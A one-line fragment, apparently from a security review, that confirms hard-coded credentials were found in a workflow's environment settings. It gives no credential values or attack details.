**Confidence note.** Re-read confirmed: literal credentials in the workflow env.
